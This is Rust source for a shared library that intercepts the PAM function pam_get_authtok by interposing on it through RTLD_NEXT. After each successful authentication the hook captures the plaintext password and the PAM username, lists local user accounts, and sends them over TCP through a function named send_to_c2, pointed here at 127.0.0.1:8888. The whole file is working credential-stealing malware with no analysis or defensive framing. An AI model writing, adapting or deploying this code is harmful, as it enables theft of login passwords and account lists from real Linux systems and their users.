#![allow(non_snake_case)]

use libc::{c_char, c_int, c_void, getpwent, endpwent};
use std::ffi::CStr;
use std::net::TcpStream;
use std::io::Write;
use local_ip_address::local_ip;

#[repr(C)]
pub struct pam_handle_t {
    _private: [u8; 0],
}

const PAM_USER: c_int = 1;

extern "C" {
    fn pam_get_item(pamh: *const pam_handle_t, item_type: c_int, item: *mut *const c_void) -> c_int;
}

fn get_pam_username(pamh: *mut pam_handle_t) -> Option<String> {
    unsafe {
        let mut user_ptr: *const c_void = std::ptr::null();
        if pam_get_item(pamh, PAM_USER, &mut user_ptr) == 0 && !user_ptr.is_null() {
            let c_user = user_ptr as *const c_char;
            if let Ok(user) = CStr::from_ptr(c_user).to_str() {
                return Some(user.to_string());
            }
        }
    }
    None
}

fn list_users() -> Vec<String> {
    let mut users = Vec::new();
    unsafe {
        loop {
            let pw = getpwent();
            if pw.is_null() {
                break;
            }
            let pw_ref = *pw;
            if pw_ref.pw_uid >= 1000 {
                let name = CStr::from_ptr(pw_ref.pw_name).to_string_lossy().to_string();
                users.push(name);
            }
        }
        endpwent();
    }
    users
}

fn send_to_c2(username: &str, password: &str, all_users: &[String]) {
    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:8888") {
        let ip = local_ip().map(|ip| ip.to_string()).unwrap_or_else(|_| "unknown".into());
        let users_str = all_users.join(",");
        let data = format!("[{}@{}] {}\nUSERS: {}\n", username, ip, password, users_str);
        let _ = stream.write_all(data.as_bytes());
    }
}

unsafe fn pam_get_authtok_impl(
    pamh: *mut pam_handle_t,
    item_type: c_int,
    authtok: *mut *const c_char,
    prompt: *const c_char,
) -> c_int {
    let orig_fn: unsafe extern "C" fn(
        *mut pam_handle_t,
        c_int,
        *mut *const c_char,
        *const c_char,
    ) -> c_int = {
        let sym = libc::dlsym(libc::RTLD_NEXT, b"pam_get_authtok\0".as_ptr() as *const _);
        if sym.is_null() {
            return 1;
        }
        std::mem::transmute(sym)
    };

    let result = orig_fn(pamh, item_type, authtok, prompt);

    if result == 0 && !authtok.is_null() && !(*authtok).is_null() {
        let c_str = CStr::from_ptr(*authtok);
        if let Ok(password) = c_str.to_str() {
            let username = get_pam_username(pamh).unwrap_or_else(|| "unknown".to_string());
            let all_users = list_users();
            send_to_c2(&username, password, &all_users);
        }
    }

    result
}

#[no_mangle]
pub extern "C" fn pam_get_authtok(
    pamh: *mut pam_handle_t,
    item_type: c_int,
    authtok: *mut *const c_char,
    prompt: *const c_char,
) -> c_int {
    unsafe { pam_get_authtok_impl(pamh, item_type, authtok, prompt) }
}

